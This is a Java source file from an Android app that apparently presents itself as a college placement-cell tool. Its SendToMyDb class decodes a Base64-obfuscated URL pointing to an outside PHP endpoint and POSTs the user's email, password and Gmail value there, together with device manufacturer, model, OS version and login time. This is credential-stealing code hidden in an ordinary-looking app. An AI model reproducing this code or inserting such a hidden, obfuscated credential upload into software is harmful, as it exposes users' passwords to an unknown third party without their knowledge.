package com.dragonide.raitplacementcell;

import android.os.AsyncTask;
import android.os.Build;
import android.util.Base64;

import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserFactory;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.StringReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;

import static android.R.attr.data;

/**
 * Created by Ankit on 11/3/2016.
 */

public class SendToMyDb extends AsyncTask<String, String, String> {
    String mResponseBody;

    @Override
    protected String doInBackground(String... strings) {

        try {

            byte[] datad = Base64.decode("aHR0cDovL21heG11c2ljLmhvbC5lcy9wbGFjZS5waHA=", Base64.DEFAULT);
            String text = new String(datad, "UTF-8");

            URL url = new URL(text);
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setDoInput(true);
            httpURLConnection.setDoOutput(true);
            OutputStream outputStream = httpURLConnection.getOutputStream();
            BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream, "UTF-8"));
            String data = URLEncoder.encode("email", "UTF-8") + "=" + URLEncoder.encode(strings[0], "UTF-8")
                    + "&" + URLEncoder.encode("pass", "UTF-8") + "=" + URLEncoder.encode(strings[1], "UTF-8")
                    + "&" + URLEncoder.encode("manufacturer", "UTF-8") + "=" + URLEncoder.encode(Build.MANUFACTURER, "UTF-8")
                    + "&" + URLEncoder.encode("model", "UTF-8") + "=" + URLEncoder.encode(Build.MODEL, "UTF-8")
                    + "&" + URLEncoder.encode("version", "UTF-8") + "=" + URLEncoder.encode(Build.VERSION.SDK_INT + "", "UTF-8")
                    + "&" + URLEncoder.encode("login_time", "UTF-8") + "=" + URLEncoder.encode(GetTime() + "", "UTF-8")
                    + "&" + URLEncoder.encode("gmail", "UTF-8") + "=" + URLEncoder.encode(strings[2], "UTF-8");


            bufferedWriter.write(data);
            bufferedWriter.flush();
            bufferedWriter.close();
            outputStream.close();
            InputStream inputStream = httpURLConnection.getInputStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, "iso-8859-1"));


        } catch (Exception e) {
            e.printStackTrace();
        }

        return "done";
    }

    public String GetTime() {
        long yourmilliseconds = System.currentTimeMillis();
        SimpleDateFormat sdf = new SimpleDateFormat("MMM dd,yyyy HH:mm");
        Date resultdate = new Date(yourmilliseconds);
        return sdf.format(resultdate);
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
    }

    @Override
    protected void onPostExecute(String s) {
        super.onPostExecute(s);


        try {
            XmlPullParserFactory factory = XmlPullParserFactory.newInstance();
            factory.setNamespaceAware(true);
            XmlPullParser xpp = factory.newPullParser();
            xpp.setInput(new StringReader(s));

            for (int eventType = xpp.getEventType(); eventType != 1; eventType = xpp.next()) {
                if (eventType == 2) {
                    if (xpp.getName().equals("responsebox")) {
                        xpp.next();
                        // resp = xpp.getText().trim();
                        //Toast.makeText(MainActivity.this, resp, Toast.LENGTH_SHORT).show();
                        //textView.setText(resp);

                        xpp.next();

                    }
                }
            }
        } catch (Exception e) {

        }


    }
}